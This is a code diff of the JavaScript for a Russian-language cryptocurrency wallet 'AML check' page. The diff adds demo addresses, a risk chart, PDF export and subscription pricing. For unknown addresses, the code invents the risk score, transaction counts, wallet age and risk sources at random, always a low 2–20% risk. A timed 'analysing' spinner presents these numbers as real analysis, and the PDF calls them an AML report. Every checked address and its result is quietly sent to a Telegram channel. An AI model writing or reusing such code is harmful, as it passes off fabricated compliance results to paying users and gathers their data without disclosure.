@@ -1,4 +1,4 @@
-// Получаем элементы со страницы
+// Получаем элементы
 const walletInput = document.getElementById('walletInput');
 const checkBtn = document.getElementById('checkBtn');
 const resultSection = document.getElementById('resultSection');
@@ -8,32 +8,71 @@ const suspiciousTx = document.getElementById('suspiciousTx');
 const walletAge = document.getElementById('walletAge');
 const lastActive = document.getElementById('lastActive');
 const riskPercent = document.getElementById('riskPercent');
-const riskFill = document.getElementById('riskFill');
+const riskChart = document.getElementById('riskChart');
+const riskLevel = document.getElementById('riskLevel');
 const sourcesList = document.getElementById('sourcesList');
+const downloadPdfBtn = document.getElementById('downloadPdfBtn');
 
-// База возможных источников риска
-const riskSources = [
-    '🔞 Эксплуатация несовершеннолетних',
-    '🛑 Даркнет-маркеты',
-    '🚫 Запрещённые сервисы',
-    '⚖️ Под следствием',
-    '🏦 Подозрительные биржи',
-    '🎰 Неавторизованные казино',
-    '🛠️ Мошеннические сервисы',
-    '🌀 Миксеры и тумблеры',
-    '💰 Вымогательство',
-    '🌍 Санкционные адреса',
-    '🎭 Мошенничество (скам)',
-    '🔪 Хакерские атаки',
-    '💣 Финансирование терроризма',
-    '🏧 Криптоматы',
-    '⚠️ Биржи без KYC',
-    '💧 Пулы ликвидности',
-    '🤝 P2P-биржи высокого риска',
-    '❓ Неизвестные сервисы'
+// Категории с иконками
+const categories = [
+    { name: 'Эксплуатация несовершеннолетних', icon: 'fa-child' },
+    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
+    { name: 'Запрещённые сервисы', icon: 'fa-ban' },
+    { name: 'Под следствием', icon: 'fa-gavel' },
+    { name: 'Подозрительные биржи', icon: 'fa-building' },
+    { name: 'Неавторизованные казино', icon: 'fa-dice' },
+    { name: 'Мошеннические сервисы', icon: 'fa-user-secret' },
+    { name: 'Миксеры и тумблеры', icon: 'fa-random' },
+    { name: 'Вымогательство', icon: 'fa-hand-holding-usd' },
+    { name: 'Санкционные адреса', icon: 'fa-flag' },
+    { name: 'Мошенничество (скам)', icon: 'fa-frown' },
+    { name: 'Хакерские атаки', icon: 'fa-hacker' },
+    { name: 'Финансирование терроризма', icon: 'fa-bomb' },
+    { name: 'Криптоматы', icon: 'fa-money-bill' },
+    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
+    { name: 'Пулы ликвидности', icon: 'fa-water' },
+    { name: 'P2P-биржи высокого риска', icon: 'fa-handshake' },
+    { name: 'Неизвестные сервисы', icon: 'fa-question' }
 ];
 
-// Функция отправки данных на серверную функцию
+// Заполняем сетку категорий
+const categoriesGrid = document.getElementById('categoriesGrid');
+categories.forEach(cat => {
+    const card = document.createElement('div');
+    card.className = 'category-card';
+    card.innerHTML = `<i class="fas ${cat.icon}"></i> ${cat.name}`;
+    categoriesGrid.appendChild(card);
+});
+
+// Демо-адреса
+const demoAddresses = {
+    '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa': { // Сатоши
+        risk: 2,
+        sources: ['Чистый кошелёк'],
+        totalTx: 1024,
+        suspiciousTx: 0,
+        age: '15 лет',
+        lastActive: '01.01.2026'
+    },
+    'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh': {
+        risk: 45,
+        sources: ['Миксеры', 'Биржи без KYC'],
+        totalTx: 345,
+        suspiciousTx: 78,
+        age: '2 года',
+        lastActive: '15.02.2026'
+    },
+    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy': {
+        risk: 88,
+        sources: ['Даркнет-маркеты', 'Вымогательство', 'Санкционные адреса'],
+        totalTx: 1567,
+        suspiciousTx: 932,
+        age: '8 мес.',
+        lastActive: '10.02.2026'
+    }
+};
+
+// Функция отправки в Telegram
 async function sendToTelegram(data) {
     try {
         const response = await fetch('/.netlify/functions/send-to-telegram', {
@@ -52,94 +91,145 @@ async function sendToTelegram(data) {
     }
 }
 
-// Функция генерации случайной даты в пределах последних 30 дней
-function randomRecentDate() {
-    const now = new Date();
-    const daysAgo = Math.floor(Math.random() * 30);
-    const date = new Date(now - daysAgo * 24 * 60 * 60 * 1000);
-    return date.toLocaleDateString('ru-RU');
+// Обновление кругового графика
+function updateRiskChart(risk) {
+    const angle = (risk / 100) * 360;
+    riskChart.style.background = `conic-gradient(#ff6b6b 0deg, #ff6b6b ${angle}deg, #00c9b7 ${angle}deg 360deg)`;
+    
+    let level = 'Низкий';
+    let color = '#00c9b7';
+    if (risk > 25 && risk <= 75) { level = 'Средний'; color = '#ffaa5e'; }
+    else if (risk > 75) { level = 'Высокий'; color = '#ff6b6b'; }
+    
+    riskLevel.textContent = level;
+    riskLevel.style.background = `linear-gradient(135deg, ${color}, #fff)`;
+    riskLevel.style.webkitBackgroundClip = 'text';
+    riskLevel.style.webkitTextFillColor = 'transparent';
+    riskPercent.textContent = risk + '%';
 }
 
-// Функция генерации случайного возраста кошелька
-function randomWalletAge() {
-    const months = Math.floor(Math.random() * 24) + 1; // от 1 до 24 месяцев
-    if (months < 12) {
-        return months + ' мес.';
-    } else {
-        const years = Math.floor(months / 12);
-        const remainingMonths = months % 12;
-        return years + ' г. ' + (remainingMonths > 0 ? remainingMonths + ' мес.' : '');
-    }
+// Генерация случайных данных
+function generateRandomData(address) {
+    const risk = Math.floor(Math.random() * 19) + 2; // 2-20%
+    const total = Math.floor(Math.random() * 500) + 50;
+    const suspicious = Math.floor(total * (risk / 100));
+    const ageMonths = Math.floor(Math.random() * 24) + 1;
+    const age = ageMonths < 12 ? ageMonths + ' мес.' : Math.floor(ageMonths/12) + ' г. ' + (ageMonths%12) + ' мес.';
+    const lastActive = new Date(Date.now() - Math.random() * 30*24*60*60*1000).toLocaleDateString('ru-RU');
+    const sourcesCount = Math.floor(risk / 10) + 1;
+    const shuffled = categories.sort(() => 0.5 - Math.random());
+    const sources = shuffled.slice(0, sourcesCount).map(c => c.name);
+    
+    return { risk, total, suspicious, age, lastActive, sources };
 }
 
-// Обработчик клика по кнопке проверки
+// Обработчик проверки
 checkBtn.addEventListener('click', function() {
     const address = walletInput.value.trim();
-    
     if (address === '') {
         alert('Введите адрес кошелька');
         return;
     }
 
-    // Показываем секцию результата
     resultSection.style.display = 'block';
-    
-    // Отображаем проверяемый адрес
     checkedAddress.textContent = address;
-    
-    // Показываем заглушки загрузки
-    totalTx.textContent = '...';
-    suspiciousTx.textContent = '...';
-    walletAge.textContent = '...';
-    lastActive.textContent = '...';
-    riskPercent.textContent = 'Проверка...';
-    riskFill.style.width = '0%';
-    sourcesList.innerHTML = '<p>⏳ Анализируем транзакции...</p>';
 
-    // Имитация задержки анализа
-    setTimeout(() => {
-        // Генерируем случайный риск от 2% до 20%
-        const risk = Math.floor(Math.random() * 19) + 2;
-        
-        // Генерируем статистику на основе риска
-        const totalTransactions = Math.floor(Math.random() * 500) + 50; // 50-550
-        const suspiciousCount = Math.floor(totalTransactions * (risk / 100)); // риск% от общего числа
-        
-        // Обновляем статистику
-        totalTx.textContent = totalTransactions.toLocaleString();
-        suspiciousTx.textContent = suspiciousCount.toLocaleString();
-        walletAge.textContent = randomWalletAge();
-        lastActive.textContent = randomRecentDate();
-        
-        // Обновляем риск
-        riskPercent.textContent = risk + '%';
-        riskFill.style.width = risk + '%';
-        riskPercent.style.color = '#00c9b7'; // всегда зелёный для демо
-
-        // Выбираем случайные источники риска
-        const numSources = Math.floor(risk / 10) + 1; // от 1 до 3
-        const shuffled = [...riskSources].sort(() => 0.5 - Math.random());
-        const selectedSources = shuffled.slice(0, numSources);
+    if (demoAddresses[address]) {
+        const data = demoAddresses[address];
+        totalTx.textContent = data.totalTx;
+        suspiciousTx.textContent = data.suspiciousTx;
+        walletAge.textContent = data.age;
+        lastActive.textContent = data.lastActive;
+        updateRiskChart(data.risk);
         
         sourcesList.innerHTML = '';
-        selectedSources.forEach(source => {
+        data.sources.forEach(s => {
             const p = document.createElement('p');
-            p.textContent = '⚠️ ' + source;
+            p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
             sourcesList.appendChild(p);
         });
+        
+        sendToTelegram({ address, risk: data.risk, sources: data.sources, totalTransactions: data.totalTx, suspiciousTransactions: data.suspiciousTx });
+    } else {
+        // Показываем загрузку
+        totalTx.textContent = '...';
+        suspiciousTx.textContent = '...';
+        walletAge.textContent = '...';
+        lastActive.textContent = '...';
+        updateRiskChart(0);
+        sourcesList.innerHTML = '<p><i class="fas fa-spinner fa-spin"></i> Анализируем...</p>';
 
-        // Отправляем данные в Telegram
-        sendToTelegram({
-            address: address,
-            risk: risk,
-            sources: selectedSources,
-            totalTransactions: totalTransactions,
-            suspiciousTransactions: suspiciousCount
-        });
-    }, 1500);
+        setTimeout(() => {
+            const random = generateRandomData(address);
+            totalTx.textContent = random.total;
+            suspiciousTx.textContent = random.suspicious;
+            walletAge.textContent = random.age;
+            lastActive.textContent = random.lastActive;
+            updateRiskChart(random.risk);
+            
+            sourcesList.innerHTML = '';
+            random.sources.forEach(s => {
+                const p = document.createElement('p');
+                p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
+                sourcesList.appendChild(p);
+            });
+            
+            sendToTelegram({ address, risk: random.risk, sources: random.sources, totalTransactions: random.total, suspiciousTransactions: random.suspicious });
+        }, 1500);
+    }
 });
 
-// Модальные окна (условия и AML-политика)
+// Скачивание PDF
+downloadPdfBtn.addEventListener('click', function() {
+    const { jsPDF } = window.jspdf;
+    const doc = new jsPDF();
+    
+    const address = checkedAddress.textContent;
+    const risk = riskPercent.textContent;
+    const total = totalTx.textContent;
+    const suspicious = suspiciousTx.textContent;
+    const age = walletAge.textContent;
+    const last = lastActive.textContent;
+    const sources = Array.from(sourcesList.children).map(p => p.textContent.replace('⚠️', '').trim()).join(', ');
+    
+    doc.setFontSize(18);
+    doc.setTextColor(0, 201, 183);
+    doc.text('Отчёт AML-проверки', 20, 20);
+    
+    doc.setFontSize(12);
+    doc.setTextColor(255, 255, 255);
+    doc.text(`Адрес: ${address}`, 20, 40);
+    doc.text(`Риск: ${risk}`, 20, 50);
+    doc.text(`Всего транзакций: ${total}`, 20, 60);
+    doc.text(`Подозрительных: ${suspicious}`, 20, 70);
+    doc.text(`Возраст: ${age}`, 20, 80);
+    doc.text(`Последняя активность: ${last}`, 20, 90);
+    doc.text(`Источники риска: ${sources}`, 20, 100);
+    
+    doc.save('AML-report.pdf');
+});
+
+// Переключение тарифов месяц/год
+const monthlyToggle = document.getElementById('monthlyToggle');
+const yearlyToggle = document.getElementById('yearlyToggle');
+const monthlyPricing = document.getElementById('monthlyPricing');
+const yearlyPricing = document.getElementById('yearlyPricing');
+
+monthlyToggle.addEventListener('click', () => {
+    monthlyToggle.classList.add('active');
+    yearlyToggle.classList.remove('active');
+    monthlyPricing.style.display = 'grid';
+    yearlyPricing.style.display = 'none';
+});
+
+yearlyToggle.addEventListener('click', () => {
+    yearlyToggle.classList.add('active');
+    monthlyToggle.classList.remove('active');
+    yearlyPricing.style.display = 'grid';
+    monthlyPricing.style.display = 'none';
+});
+
+// Модальные окна (можно дополнить содержимым позже)
 const termsModal = document.getElementById('termsModal');
 const amlModal = document.getElementById('amlModal');
 const showTerms = document.getElementById('showTerms');
@@ -147,31 +237,24 @@ const showAML = document.getElementById('showAMLPolicy');
 const closeButtons = document.querySelectorAll('.close, .close-aml');
 
 if (showTerms) {
-    showTerms.addEventListener('click', function(e) {
+    showTerms.addEventListener('click', (e) => {
         e.preventDefault();
         termsModal.style.display = 'block';
     });
 }
-
 if (showAML) {
-    showAML.addEventListener('click', function(e) {
+    showAML.addEventListener('click', (e) => {
         e.preventDefault();
         amlModal.style.display = 'block';
     });
 }
-
 closeButtons.forEach(btn => {
-    btn.addEventListener('click', function() {
+    btn.addEventListener('click', () => {
         termsModal.style.display = 'none';
         amlModal.style.display = 'none';
     });
 });
-
-window.addEventListener('click', function(e) {
-    if (e.target === termsModal) {
-        termsModal.style.display = 'none';
-    }
-    if (e.target === amlModal) {
-        amlModal.style.display = 'none';
-    }
+window.addEventListener('click', (e) => {
+    if (e.target === termsModal) termsModal.style.display = 'none';
+    if (e.target === amlModal) amlModal.style.display = 'none';
 });
